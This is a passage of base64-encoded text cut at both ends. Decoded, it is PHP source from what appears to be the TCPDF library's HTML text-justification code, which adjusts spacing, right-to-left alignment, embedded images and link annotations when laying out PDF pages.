luZXBhZ2UpLCAkc3RhcnRsaW5lcG9zKTsKCQkJCQkJCSRwZW5kID0gJyc7CgkJCQkJCX0KCQkJCQl9CgkJCQkJaWYgKCgoKCgkcGxhbGlnbiA9PSAnQycpIE9SICgkcGxhbGlnbiA9PSAnSicpIE9SICgoJHBsYWxpZ24gPT0gJ1InKSBBTkQgKCEkdGhpcy0+cnRsKSkgT1IgKCgkcGxhbGlnbiA9PSAnTCcpIEFORCAoJHRoaXMtPnJ0bCkpKSkpKSB7CgkJCQkJCS8vIGNhbGN1bGF0ZSBzaGlmdGluZyBhbW91bnQKCQkJCQkJJHR3ID0gJHc7CgkJCQkJCWlmICgoJHBsYWxpZ24gPT0gJ0onKSBBTkQgJHRoaXMtPmlzUlRMVGV4dERpcigpIEFORCAoJHRoaXMtPm51bV9jb2x1bW5zID4gMSkpIHsKCQkJCQkJCSR0dyArPSAkdGhpcy0+Y2VsbF9wYWRkaW5nWydSJ107CgkJCQkJCX0KCQkJCQkJaWYgKCR0aGlzLT5sTWFyZ2luICE9ICRwcmV2bE1hcmdpbikgewoJCQkJCQkJJHR3ICs9ICgkcHJldmxNYXJnaW4gLSAkdGhpcy0+bE1hcmdpbik7CgkJCQkJCX0KCQkJCQkJaWYgKCR0aGlzLT5yTWFyZ2luICE9ICRwcmV2ck1hcmdpbikgewoJCQkJCQkJJHR3ICs9ICgkcHJldnJNYXJnaW4gLSAkdGhpcy0+ck1hcmdpbik7CgkJCQkJCX0KCQkJCQkJJG9uZV9zcGFjZV93aWR0aCA9ICR0aGlzLT5HZXRTdHJpbmdXaWR0aChjaHIoMzIpKTsKCQkJCQkJJG5vID0gMDsgLy8gbnVtYmVyIG9mIHNwYWNlcyBvbiBhIGxpbmUgY29udGFpbmVkIG9uIGEgc2luZ2xlIGJsb2NrCgkJCQkJCWlmICgkdGhpcy0+aXNSVExUZXh0RGlyKCkpIHsgLy8gUlRMCgkJCQkJCQkvLyByZW1vdmUgbGVmdCBzcGFjZSBpZiBleGlzdAoJCQkJCQkJJHBvczEgPSBUQ1BERl9TVEFUSUM6OnJldnN0cnBvcygkcG1pZCwgJ1soJyk7CgkJCQkJCQlpZiAoJHBvczEgPiAwKSB7CgkJCQkJCQkJJHBvczEgPSBpbnR2YWwoJHBvczEpOwoJCQkJCQkJCWlmICgkdGhpcy0+aXNVbmljb2RlRm9udCgpKSB7CgkJCQkJCQkJCSRwb3MyID0gaW50dmFsKFRDUERGX1NUQVRJQzo6cmV2c3RycG9zKCRwbWlkLCAnWygnLmNocigwKS5jaHIoMzIpKSk7CgkJCQkJCQkJCSRzcGFjZWxlbiA9IDI7CgkJCQkJCQkJfSBlbHNlIHsKCQkJCQkJCQkJJHBvczIgPSBpbnR2YWwoVENQREZfU1RBVElDOjpyZXZzdHJwb3MoJHBtaWQsICdbKCcuY2hyKDMyKSkpOwoJCQkJCQkJCQkkc3BhY2VsZW4gPSAxOwoJCQkJCQkJCX0KCQkJCQkJCQlpZiAoJHBvczEgPT0gJHBvczIpIHsKCQkJCQkJCQkJJHBtaWQgPSBzdWJzdHIoJHBtaWQsIDAsICgkcG9zMSArIDIpKS5zdWJzdHIoJHBtaWQsICgkcG9zMSArIDIgKyAkc3BhY2VsZW4pKTsKCQkJCQkJCQkJaWYgKHN1YnN0cigkcG1pZCwgJHBvczEsIDQpID09ICdbKCldJykgewoJCQkJCQkJCQkJJGxpbmV3IC09ICRvbmVfc3BhY2Vfd2lkdGg7CgkJCQkJCQkJCX0gZWxzZWlmICgkcG9zMSA9PSBzdHJwb3MoJHBtaWQsICdbKCcpKSB7CgkJCQkJCQkJCQkkbm8gPSAxOwoJCQkJCQkJCQl9CgkJCQkJCQkJfQoJCQkJCQkJfQoJCQkJCQl9IGVsc2UgeyAvLyBMVFIKCQkJCQkJCS8vIHJlbW92ZSByaWdodCBzcGFjZSBpZiBleGlzdAoJCQkJCQkJJHBvczEgPSBUQ1BERl9TVEFUSUM6OnJldnN0cnBvcygkcG1pZCwgJyldJyk7CgkJCQkJCQlpZiAoJHBvczEgPiAwKSB7CgkJCQkJCQkJJHBvczEgPSBpbnR2YWwoJHBvczEpOwoJCQkJCQkJCWlmICgkdGhpcy0+aXNVbmljb2RlRm9udCgpKSB7CgkJCQkJCQkJCSRwb3MyID0gaW50dmFsKFRDUERGX1NUQVRJQzo6cmV2c3RycG9zKCRwbWlkLCBjaHIoMCkuY2hyKDMyKS4nKV0nKSkgKyAyOwoJCQkJCQkJCQkkc3BhY2VsZW4gPSAyOwoJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCSRwb3MyID0gaW50dmFsKFRDUERGX1NUQVRJQzo6cmV2c3RycG9zKCRwbWlkLCBjaHIoMzIpLicpXScpKSArIDE7CgkJCQkJCQkJCSRzcGFjZWxlbiA9IDE7CgkJCQkJCQkJfQoJCQkJCQkJCWlmICgkcG9zMSA9PSAkcG9zMikgewoJCQkJCQkJCQkkcG1pZCA9IHN1YnN0cigkcG1pZCwgMCwgKCRwb3MxIC0gJHNwYWNlbGVuKSkuc3Vic3RyKCRwbWlkLCAkcG9zMSk7CgkJCQkJCQkJCSRsaW5ldyAtPSAkb25lX3NwYWNlX3dpZHRoOwoJCQkJCQkJCX0KCQkJCQkJCX0KCQkJCQkJfQoJCQkJCQkkbWRpZmYgPSAoJHR3IC0gJGxpbmV3KTsKCQkJCQkJaWYgKCRwbGFsaWduID09ICdDJykgewoJCQkJCQkJaWYgKCR0aGlzLT5ydGwpIHsKCQkJCQkJCQkkdF94ID0gLSgkbWRpZmYgLyAyKTsKCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJJHRfeCA9ICgkbWRpZmYgLyAyKTsKCQkJCQkJCX0KCQkJCQkJfSBlbHNlaWYgKCRwbGFsaWduID09ICdSJykgewoJCQkJCQkJLy8gcmlnaHQgYWxpZ25tZW50IG9uIExUUiBkb2N1bWVudAoJCQkJCQkJJHRfeCA9ICRtZGlmZjsKCQkJCQkJfSBlbHNlaWYgKCRwbGFsaWduID09ICdMJykgewoJCQkJCQkJLy8gbGVmdCBhbGlnbm1lbnQgb24gUlRMIGRvY3VtZW50CgkJCQkJCQkkdF94ID0gLSRtZGlmZjsKCQkJCQkJfSBlbHNlaWYgKCgkcGxhbGlnbiA9PSAnSicpIEFORCAoJHBsYWxpZ24gPT0gJGxhbGlnbikpIHsKCQkJCQkJCS8vIEp1c3RpZmljYXRpb24KCQkJCQkJCWlmICgkdGhpcy0+aXNSVExUZXh0RGlyKCkpIHsKCQkJCQkJCQkvLyBhbGlnbiB0ZXh0IG9uIHRoZSBsZWZ0CgkJCQkJCQkJJHRfeCA9IC0kbWRpZmY7CgkJCQkJCQl9CgkJCQkJCQkkbnMgPSAwOyAvLyBudW1iZXIgb2Ygc3BhY2VzCgkJCQkJCQkkcG1pZHRlbXAgPSAkcG1pZDsKCQkJCQkJCS8vIGVzY2FwZSBzcGVjaWFsIGNoYXJhY3RlcnMKCQkJCQkJCSRwbWlkdGVtcCA9IHByZWdfcmVwbGFjZSgnL1tcXFxdW1woXS94JywgJ1xcIyEjT1AjISMnLCAkcG1pZHRlbXApOwoJCQkJCQkJJHBtaWR0ZW1wID0gcHJlZ19yZXBsYWNlKCcvW1xcXF1bXCldL3gnLCAnXFwjISNDUCMhIycsICRwbWlkdGVtcCk7CgkJCQkJCQkvLyBzZWFyY2ggc3BhY2VzCgkJCQkJCQlpZiAocHJlZ19tYXRjaF9hbGwoJy9cW1woKFteXCldKilcKVxdL3gnLCAkcG1pZHRlbXAsICRsbnN0cmluZywgUFJFR19QQVRURVJOX09SREVSKSkgewoJCQkJCQkJCSRzcGFjZXN0ciA9ICR0aGlzLT5nZXRTcGFjZVN0cmluZygpOwoJCQkJCQkJCSRtYXhrayA9IGNvdW50KCRsbnN0cmluZ1sxXSkgLSAxOwoJCQkJCQkJCWZvciAoJGtrPTA7ICRrayA8PSAkbWF4a2s7ICsrJGtrKSB7CgkJCQkJCQkJCS8vIHJlc3RvcmUgc3BlY2lhbCBjaGFyYWN0ZXJzCgkJCQkJCQkJCSRsbnN0cmluZ1sxXVska2tdID0gc3RyX3JlcGxhY2UoJyMhI09QIyEjJywgJygnLCAkbG5zdHJpbmdbMV1bJGtrXSk7CgkJCQkJCQkJCSRsbnN0cmluZ1sxXVska2tdID0gc3RyX3JlcGxhY2UoJyMhI0NQIyEjJywgJyknLCAkbG5zdHJpbmdbMV1bJGtrXSk7CgkJCQkJCQkJCS8vIHN0b3JlIG51bWJlciBvZiBzcGFjZXMgb24gdGhlIHN0cmluZ3MKCQkJCQkJCQkJJGxuc3RyaW5nWzJdWyRra10gPSBzdWJzdHJfY291bnQoJGxuc3RyaW5nWzFdWyRra10sICRzcGFjZXN0cik7CgkJCQkJCQkJCS8vIGNvdW50IHRvdGFsIHNwYWNlcyBvbiBsaW5lCgkJCQkJCQkJCSRucyArPSAkbG5zdHJpbmdbMl1bJGtrXTsKCQkJCQkJCQkJJGxuc3RyaW5nWzNdWyRra10gPSAkbnM7CgkJCQkJCQkJfQoJCQkJCQkJCWlmICgkbnMgPT0gMCkgewoJCQkJCQkJCQkkbnMgPSAxOwoJCQkJCQkJCX0KCQkJCQkJCQkvLyBjYWxjdWxhdGUgYWRkaXRpb25hbCBzcGFjZSB0byBhZGQgdG8gZWFjaCBleGlzdGluZyBzcGFjZQoJCQkJCQkJCSRzcGFjZXdpZHRoID0gKCRtZGlmZiAvICgkbnMgLSAkbm8pKSAqICR0aGlzLT5rOwoJCQkJCQkJCWlmICgkdGhpcy0+Rm9udFNpemUgPD0gMCkgewoJCQkJCQkJCQkkdGhpcy0+Rm9udFNpemUgPSAxOwoJCQkJCQkJCX0KCQkJCQkJCQkkc3BhY2V3aWR0aHUgPSAtMTAwMCAqICgkbWRpZmYgKyAoKCRucyArICRubykgKiAkb25lX3NwYWNlX3dpZHRoKSkgLyAkbnMgLyAkdGhpcy0+Rm9udFNpemU7CgkJCQkJCQkJaWYgKCR0aGlzLT5mb250X3NwYWNpbmcgIT0gMCkgewoJCQkJCQkJCQkvLyBmaXhlZCBzcGFjaW5nIG1vZGUKCQkJCQkJCQkJJG9zdyA9IC0xMDAwICogJHRoaXMtPmZvbnRfc3BhY2luZyAvICR0aGlzLT5Gb250U2l6ZTsKCQkJCQkJCQkJJHNwYWNld2lkdGh1ICs9ICRvc3c7CgkJCQkJCQkJfQoJCQkJCQkJCSRuc21heCA9ICRuczsKCQkJCQkJCQkkbnMgPSAwOwoJCQkJCQkJCXJlc2V0KCRsbnN0cmluZyk7CgkJCQkJCQkJJG9mZnNldCA9IDA7CgkJCQkJCQkJJHN0cmNvdW50ID0gMDsKCQkJCQkJCQkkcHJldl9lcHNwb3NiZWcgPSAwOwoJCQkJCQkJCSR0ZXh0cG9zID0gMDsKCQkJCQkJCQlpZiAoJHRoaXMtPmlzUlRMVGV4dERpcigpKSB7CgkJCQkJCQkJCSR0ZXh0cG9zID0gJHRoaXMtPndQdDsKCQkJCQkJCQl9CgkJCQkJCQkJd2hpbGUgKHByZWdfbWF0Y2goJy8oWzAtOVwuXCtcLV0qKVtcc10oVGR8Y218bXxsfGN8cmUpW1xzXS94JywgJHBtaWQsICRzdHJwaWVjZSwgUFJFR19PRkZTRVRfQ0FQVFVSRSwgJG9mZnNldCkgPT0gMSkgewoJCQkJCQkJCQkvLyBjaGVjayBpZiB3ZSBhcmUgaW5zaWRlIGEgc3RyaW5nIHNlY3Rpb24gJ1soIC4uLiApXScKCQkJCQkJCQkJJHN0cm9mZnNldCA9IHN0cnBvcygkcG1pZCwgJ1soJywgJG9mZnNldCk7CgkJCQkJCQkJCWlmICgoJHN0cm9mZnNldCAhPT0gZmFsc2UpIEFORCAoJHN0cm9mZnNldCA8PSAkc3RycGllY2VbMl1bMV0pKSB7CgkJCQkJCQkJCQkvLyBzZXQgb2Zmc2V0IHRvIHRoZSBlbmQgb2Ygc3RyaW5nIHNlY3Rpb24KCQkJCQkJCQkJCSRvZmZzZXQgPSBzdHJwb3MoJHBtaWQsICcpXScsICRzdHJvZmZzZXQpOwoJCQkJCQkJCQkJd2hpbGUgKCgkb2Zmc2V0ICE9PSBmYWxzZSkgQU5EICgkcG1pZFsoJG9mZnNldCAtIDEpXSA9PSAnXFwnKSkgewoJCQkJCQkJCQkJCSRvZmZzZXQgPSBzdHJwb3MoJHBtaWQsICcpXScsICgkb2Zmc2V0ICsgMSkpOwoJCQkJCQkJCQkJfQoJCQkJCQkJCQkJaWYgKCRvZmZzZXQgPT09IGZhbHNlKSB7CgkJCQkJCQkJCQkJJHRoaXMtPkVycm9yKCdIVE1MIEp1c3RpZmljYXRpb246IG1hbGZvcm1lZCBQREYgY29kZS4nKTsKCQkJCQkJCQkJCX0KCQkJCQkJCQkJCWNvbnRpbnVlOwoJCQkJCQkJCQl9CgkJCQkJCQkJCWlmICgkdGhpcy0+aXNSVExUZXh0RGlyKCkpIHsKCQkJCQkJCQkJCSRzcGFjZXcgPSAoJHNwYWNld2lkdGggKiAoJG5zbWF4IC0gJG5zKSk7CgkJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCQkkc3BhY2V3ID0gKCRzcGFjZXdpZHRoICogJG5zKTsKCQkJCQkJCQkJfQoJCQkJCQkJCQkkb2Zmc2V0ID0gJHN0cnBpZWNlWzJdWzFdICsgc3RybGVuKCRzdHJwaWVjZVsyXVswXSk7CgkJCQkJCQkJCSRlcHNwb3NlbmQgPSBzdHJwb3MoJHBtaWQsICR0aGlzLT5lcHNtYXJrZXIuJ1EnLCAkb2Zmc2V0KTsKCQkJCQkJCQkJaWYgKCRlcHNwb3NlbmQgIT09IG51bGwpIHsKCQkJCQkJCQkJCSRlcHNwb3NlbmQgKz0gc3RybGVuKCR0aGlzLT5lcHNtYXJrZXIuJ1EnKTsKCQkJCQkJCQkJCSRlcHNwb3NiZWcgPSBzdHJwb3MoJHBtaWQsICdxJy4kdGhpcy0+ZXBzbWFya2VyLCAkb2Zmc2V0KTsKCQkJCQkJCQkJCWlmICgkZXBzcG9zYmVnID09PSBudWxsKSB7CgkJCQkJCQkJCQkJJGVwc3Bvc2JlZyA9IHN0cnBvcygkcG1pZCwgJ3EnLiR0aGlzLT5lcHNtYXJrZXIsICgkcHJldl9lcHNwb3NiZWcgLSA2KSk7CgkJCQkJCQkJCQkJJHByZXZfZXBzcG9zYmVnID0gJGVwc3Bvc2JlZzsKCQkJCQkJCQkJCX0KCQkJCQkJCQkJCWlmICgoJGVwc3Bvc2JlZyA+IDApIEFORCAoJGVwc3Bvc2VuZCA+IDApIEFORCAoJG9mZnNldCA+ICRlcHNwb3NiZWcpIEFORCAoJG9mZnNldCA8ICRlcHNwb3NlbmQpKSB7CgkJCQkJCQkJCQkJLy8gc2hpZnQgRVBTIGltYWdlcwoJCQkJCQkJCQkJCSR0cnggPSBzcHJpbnRmKCcxIDAgMCAxICVGIDAgY20nLCAkc3BhY2V3KTsKCQkJCQkJCQkJCQkkcG1pZF9iID0gc3Vic3RyKCRwbWlkLCAwLCAkZXBzcG9zYmVnKTsKCQkJCQkJCQkJCQkkcG1pZF9tID0gc3Vic3RyKCRwbWlkLCAkZXBzcG9zYmVnLCAoJGVwc3Bvc2VuZCAtICRlcHNwb3NiZWcpKTsKCQkJCQkJCQkJCQkkcG1pZF9lID0gc3Vic3RyKCRwbWlkLCAkZXBzcG9zZW5kKTsKCQkJCQkJCQkJCQkkcG1pZCA9ICRwbWlkX2IuIlxucVxuIi4kdHJ4LiJcbiIuJHBtaWRfbS4iXG5RXG4iLiRwbWlkX2U7CgkJCQkJCQkJCQkJJG9mZnNldCA9ICRlcHNwb3NlbmQ7CgkJCQkJCQkJCQkJY29udGludWU7CgkJCQkJCQkJCQl9CgkJCQkJCQkJCX0KCQkJCQkJCQkJJGN1cnJlbnR4cG9zID0gMDsKCQkJCQkJCQkJLy8gc2hpZnQgYmxvY2tzIG9mIGNvZGUKCQkJCQkJCQkJc3dpdGNoICgkc3RycGllY2VbMl1bMF0pIHsKCQkJCQkJCQkJCWNhc2UgJ1RkJzoKCQkJCQkJCQkJCWNhc2UgJ2NtJzoKCQkJCQkJCQkJCWNhc2UgJ20nOgoJCQkJCQkJCQkJY2FzZSAnbCc6IHsKCQkJCQkJCQkJCQkvLyBnZXQgY3VycmVudCBYIHBvc2l0aW9uCgkJCQkJCQkJCQkJcHJlZ19tYXRjaCgnLyhbMC05XC5cK1wtXSopW1xzXSgnLiRzdHJwaWVjZVsxXVswXS4nKVtcc10oJy4kc3RycGllY2VbMl1bMF0uJykoW1xzXSopL3gnLCAkcG1pZCwgJHhtYXRjaGVzKTsKCQkJCQkJCQkJCQlpZiAoIWlzc2V0KCR4bWF0Y2hlc1sxXSkpIHsKCQkJCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJCQkJfQoJCQkJCQkJCQkJCSRjdXJyZW50eHBvcyA9ICR4bWF0Y2hlc1sxXTsKCQkJCQkJCQkJCQkkdGV4dHBvcyA9ICRjdXJyZW50eHBvczsKCQkJCQkJCQkJCQlpZiAoKCRzdHJjb3VudCA8PSAkbWF4a2spIEFORCAoJHN0cnBpZWNlWzJdWzBdID09ICdUZCcpKSB7CgkJCQkJCQkJCQkJCSRucyA9ICRsbnN0cmluZ1szXVskc3RyY291bnRdOwoJCQkJCQkJCQkJCQlpZiAoJHRoaXMtPmlzUlRMVGV4dERpcigpKSB7CgkJCQkJCQkJCQkJCQkkc3BhY2V3ID0gKCRzcGFjZXdpZHRoICogKCRuc21heCAtICRucykpOwoJCQkJCQkJCQkJCQl9CgkJCQkJCQkJCQkJCSsrJHN0cmNvdW50OwoJCQkJCQkJCQkJCX0KCQkJCQkJCQkJCQkvLyBqdXN0aWZ5IGJsb2NrCgkJCQkJCQkJCQkJaWYgKHByZWdfbWF0Y2goJy8oWzAtOVwuXCtcLV0qKVtcc10oJy4kc3RycGllY2VbMV1bMF0uJylbXHNdKCcuJHN0cnBpZWNlWzJdWzBdLicpKFtcc10qKS94JywgJHBtaWQsICRwbWF0Y2gpID09IDEpIHsKCQkJCQkJCQkJCQkJJG5ld3BtaWQgPSBzcHJpbnRmKCclRicsKGZsb2F0dmFsKCRwbWF0Y2hbMV0pICsgJHNwYWNldykpLicgJy4kcG1hdGNoWzJdLicgeCojISMqeCcuJHBtYXRjaFszXS4kcG1hdGNoWzRdOwoJCQkJCQkJCQkJCQkkcG1pZCA9IHN0cl9yZXBsYWNlKCRwbWF0Y2hbMF0sICRuZXdwbWlkLCAkcG1pZCk7CgkJCQkJCQkJCQkJCXVuc2V0KCRwbWF0Y2gsICRuZXdwbWlkKTsKCQkJCQkJCQkJCQl9CgkJCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJCQl9CgkJCQkJCQkJCQljYXNlICdyZSc6IHsKCQkJCQkJCQkJCQkvLyBqdXN0aWZ5IGJsb2NrCgkJCQkJCQkJCQkJaWYgKCFUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkdGhpcy0+bGlzcGFjZXIpKSB7CgkJCQkJCQkJCQkJCSR0aGlzLT5saXNwYWNlciA9ICcnOwoJCQkJCQkJCQkJCQlicmVhazsKCQkJCQkJCQkJCQl9CgkJCQkJCQkJCQkJcHJlZ19tYXRjaCgnLyhbMC05XC5cK1wtXSopW1xzXShbMC05XC5cK1wtXSopW1xzXShbMC05XC5cK1wtXSopW1xzXSgnLiRzdHJwaWVjZVsxXVswXS4nKVtcc10ocmUpKFtcc10qKS94JywgJHBtaWQsICR4bWF0Y2hlcyk7CgkJCQkJCQkJCQkJaWYgKCFpc3NldCgkeG1hdGNoZXNbMV0pKSB7CgkJCQkJCQkJCQkJCWJyZWFrOwoJCQkJCQkJCQkJCX0KCQkJCQkJCQkJCQkkY3VycmVudHhwb3MgPSAkeG1hdGNoZXNbMV07CgkJCQkJCQkJCQkJJHhfZGlmZiA9IDA7CgkJCQkJCQkJCQkJJHdfZGlmZiA9IDA7CgkJCQkJCQkJCQkJaWYgKCR0aGlzLT5pc1JUTFRleHREaXIoKSkgeyAvLyBSVEwKCQkJCQkJCQkJCQkJaWYgKCRjdXJyZW50eHBvcyA8ICR0ZXh0cG9zKSB7CgkJCQkJCQkJCQkJCQkkeF9kaWZmID0gKCRzcGFjZXdpZHRoICogKCRuc21heCAtICRsbnN0cmluZ1szXVskc3RyY291bnRdKSk7CgkJCQkJCQkJCQkJCQkkd19kaWZmID0gKCRzcGFjZXdpZHRoICogJGxuc3RyaW5nWzJdWyRzdHJjb3VudF0pOwoJCQkJCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkJCQkJaWYgKCRzdHJjb3VudCA+IDApIHsKCQkJCQkJCQkJCQkJCQkkeF9kaWZmID0gKCRzcGFjZXdpZHRoICogKCRuc21heCAtICRsbnN0cmluZ1szXVsoJHN0cmNvdW50IC0gMSldKSk7CgkJCQkJCQkJCQkJCQkJJHdfZGlmZiA9ICgkc3BhY2V3aWR0aCAqICRsbnN0cmluZ1syXVsoJHN0cmNvdW50IC0gMSldKTsKCQkJCQkJCQkJCQkJCX0KCQkJCQkJCQkJCQkJfQoJCQkJCQkJCQkJCX0gZWxzZSB7IC8vIExUUgoJCQkJCQkJCQkJCQlpZiAoJGN1cnJlbnR4cG9zID4gJHRleHRwb3MpIHsKCQkJCQkJCQkJCQkJCWlmICgkc3RyY291bnQgPiAwKSB7CgkJCQkJCQkJCQkJCQkJJHhfZGlmZiA9ICgkc3BhY2V3aWR0aCAqICRsbnN0cmluZ1szXVsoJHN0cmNvdW50IC0gMSldKTsKCQkJCQkJCQkJCQkJCX0KCQkJCQkJCQkJCQkJCSR3X2RpZmYgPSAoJHNwYWNld2lkdGggKiAkbG5zdHJpbmdbMl1bJHN0cmNvdW50XSk7CgkJCQkJCQkJCQkJCX0gZWxzZSB7CgkJCQkJCQkJCQkJCQlpZiAoJHN0cmNvdW50ID4gMSkgewoJCQkJCQkJCQkJCQkJCSR4X2RpZmYgPSAoJHNwYWNld2lkdGggKiAkbG5zdHJpbmdbM11bKCRzdHJjb3VudCAtIDIpXSk7CgkJCQkJCQkJCQkJCQl9CgkJCQkJCQkJCQkJCQlpZiAoJHN0cmNvdW50ID4gMCkgewoJCQkJCQkJCQkJCQkJCSR3X2RpZmYgPSAoJHNwYWNld2lkdGggKiAkbG5zdHJpbmdbMl1bKCRzdHJjb3VudCAtIDEpXSk7CgkJCQkJCQkJCQkJCQl9CgkJCQkJCQkJCQkJCX0KCQkJCQkJCQkJCQl9CgkJCQkJCQkJCQkJaWYgKHByZWdfbWF0Y2goJy8oJy4keG1hdGNoZXNbMV0uJylbXHNdKCcuJHhtYXRjaGVzWzJdLicpW1xzXSgnLiR4bWF0Y2hlc1szXS4nKVtcc10oJy4kc3RycGllY2VbMV1bMF0uJylbXHNdKHJlKShbXHNdKikveCcsICRwbWlkLCAkcG1hdGNoKSA9PSAxKSB7CgkJCQkJCQkJCQkJCSRuZXd4ID0gc3ByaW50ZignJUYnLChmbG9hdHZhbCgkcG1hdGNoWzFdKSArICR4X2RpZmYpKTsKCQkJCQkJCQkJCQkJJG5ld3cgPSBzcHJpbnRmKCclRicsKGZsb2F0dmFsKCRwbWF0Y2hbM10pICsgJHdfZGlmZikpOwoJCQkJCQkJCQkJCQkkbmV3cG1pZCA9ICRuZXd4LicgJy4kcG1hdGNoWzJdLicgJy4kbmV3dy4nICcuJHBtYXRjaFs0XS4nIHgqIyEjKngnLiRwbWF0Y2hbNV0uJHBtYXRjaFs2XTsKCQkJCQkJCQkJCQkJJHBtaWQgPSBzdHJfcmVwbGFjZSgkcG1hdGNoWzBdLCAkbmV3cG1pZCwgJHBtaWQpOwoJCQkJCQkJCQkJCQl1bnNldCgkcG1hdGNoLCAkbmV3cG1pZCwgJG5ld3gsICRuZXd3KTsKCQkJCQkJCQkJCQl9CgkJCQkJCQkJCQkJYnJlYWs7CgkJCQkJCQkJCQl9CgkJCQkJCQkJCQljYXNlICdjJzogewoJCQkJCQkJCQkJCS8vIGdldCBjdXJyZW50IFggcG9zaXRpb24KCQkJCQkJCQkJCQlwcmVnX21hdGNoKCcvKFswLTlcLlwrXC1dKilbXHNdKFswLTlcLlwrXC1dKilbXHNdKFswLTlcLlwrXC1dKilbXHNdKFswLTlcLlwrXC1dKilbXHNdKFswLTlcLlwrXC1dKilbXHNdKCcuJHN0cnBpZWNlWzFdWzBdLicpW1xzXShjKShbXHNdKikveCcsICRwbWlkLCAkeG1hdGNoZXMpOwoJCQkJCQkJCQkJCWlmICghaXNzZXQoJHhtYXRjaGVzWzFdKSkgewoJCQkJCQkJCQkJCQlicmVhazsKCQkJCQkJCQkJCQl9CgkJCQkJCQkJCQkJJGN1cnJlbnR4cG9zID0gJHhtYXRjaGVzWzFdOwoJCQkJCQkJCQkJCS8vIGp1c3RpZnkgYmxvY2sKCQkJCQkJCQkJCQlpZiAocHJlZ19tYXRjaCgnLygnLiR4bWF0Y2hlc1sxXS4nKVtcc10oJy4keG1hdGNoZXNbMl0uJylbXHNdKCcuJHhtYXRjaGVzWzNdLicpW1xzXSgnLiR4bWF0Y2hlc1s0XS4nKVtcc10oJy4keG1hdGNoZXNbNV0uJylbXHNdKCcuJHN0cnBpZWNlWzFdWzBdLicpW1xzXShjKShbXHNdKikveCcsICRwbWlkLCAkcG1hdGNoKSA9PSAxKSB7CgkJCQkJCQkJCQkJCSRuZXd4MSA9IHNwcmludGYoJyVGJywoZmxvYXR2YWwoJHBtYXRjaFsxXSkgKyAkc3BhY2V3KSk7CgkJCQkJCQkJCQkJCSRuZXd4MiA9IHNwcmludGYoJyVGJywoZmxvYXR2YWwoJHBtYXRjaFszXSkgKyAkc3BhY2V3KSk7CgkJCQkJCQkJCQkJCSRuZXd4MyA9IHNwcmludGYoJyVGJywoZmxvYXR2YWwoJHBtYXRjaFs1XSkgKyAkc3BhY2V3KSk7CgkJCQkJCQkJCQkJCSRuZXdwbWlkID0gJG5ld3gxLicgJy4kcG1hdGNoWzJdLicgJy4kbmV3eDIuJyAnLiRwbWF0Y2hbNF0uJyAnLiRuZXd4My4nICcuJHBtYXRjaFs2XS4nIHgqIyEjKngnLiRwbWF0Y2hbN10uJHBtYXRjaFs4XTsKCQkJCQkJCQkJCQkJJHBtaWQgPSBzdHJfcmVwbGFjZSgkcG1hdGNoWzBdLCAkbmV3cG1pZCwgJHBtaWQpOwoJCQkJCQkJCQkJCQl1bnNldCgkcG1hdGNoLCAkbmV3cG1pZCwgJG5ld3gxLCAkbmV3eDIsICRuZXd4Myk7CgkJCQkJCQkJCQkJfQoJCQkJCQkJCQkJCWJyZWFrOwoJCQkJCQkJCQkJfQoJCQkJCQkJCQl9CgkJCQkJCQkJCS8vIHNoaWZ0IHRoZSBhbm5vdGF0aW9ucyBhbmQgbGlua3MKCQkJCQkJCQkJJGN4cG9zID0gKCRjdXJyZW50eHBvcyAvICR0aGlzLT5rKTsKCQkJCQkJCQkJJGxtcG9zID0gKCR0aGlzLT5sTWFyZ2luICsgJHRoaXMtPmNlbGxfcGFkZGluZ1snTCddICsgJHRoaXMtPmZlcHMpOwoJCQkJCQkJCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkJCQkJCQkJLy8gd2UgYXJlIGluc2lkZSBhbiBYT2JqZWN0IHRlbXBsYXRlCgkJCQkJCQkJCQlmb3JlYWNoICgkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ2Fubm90YXRpb25zJ10gYXMgJHBhayA9PiAkcGFjKSB7CgkJCQkJCQkJCQkJaWYgKCgkcGFjWyd5J10gPj0gJG1pbnN0YXJ0bGluZXkpIEFORCAoKCRwYWNbJ3gnXSAqICR0aGlzLT5rKSA+PSAoJGN1cnJlbnR4cG9zIC0gJHRoaXMtPmZlcHMpKSBBTkQgKCgkcGFjWyd4J10gKiAkdGhpcy0+aykgPD0gKCRjdXJyZW50eHBvcyArICR0aGlzLT5mZXBzKSkpIHsKCQkJCQkJCQkJCQkJaWYgKCRjeHBvcyA+ICRsbXBvcykgewoJCQkJCQkJCQkJCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydhbm5vdGF0aW9ucyddWyRwYWtdWyd4J10gKz0gKCRzcGFjZXcgLyAkdGhpcy0+ayk7CgkJCQkJCQkJCQkJCQkkdGhpcy0+eG9iamVjdHNbJHRoaXMtPnhvYmppZF1bJ2Fubm90YXRpb25zJ11bJHBha11bJ3cnXSArPSAoKCRzcGFjZXdpZHRoICogJHBhY1snbnVtc3BhY2VzJ10pIC8gJHRoaXMtPmspOwoJCQkJCQkJCQkJCQl9IGVsc2UgewoJCQkJCQkJCQkJCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydhbm5vdGF0aW9ucyddWyRwYWtdWyd3J10gKz0gKCgkc3BhY2V3aWR0aCAqICRwYWNbJ251bXNwYWNlcyddKSAvICR0aGlzLT5rKTsKCQkJCQkJCQkJCQkJfQoJCQkJCQkJCQkJCQlicmVhazsKCQkJCQkJCQkJCQl9CgkJCQkJCQkJCQl9CgkJCQkJCQkJCX0gZWxzZWlmIChpc3NldCgkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV0pKSB7CgkJCQkJCQkJCQlmb3JlYWNoICgkdGhpcy0+UGFnZUFubm90c1skdGhpcy0+cGFnZV0gYXMgJHBhayA9PiAkcGFjKSB7CgkJCQkJCQkJCQkJaWYgKCgkcGFjWyd5J10gPj0gJG1pbnN0YXJ0bGluZXkpIEFORCAoKCRwYWNbJ3gnXSAqICR0aGlzLT5rKSA+PSAoJGN1cnJlbnR4cG9zIC0gJHRoaXMtPmZlcHMpKSBBTkQgKCgkcGFjWyd4J10gKiAkd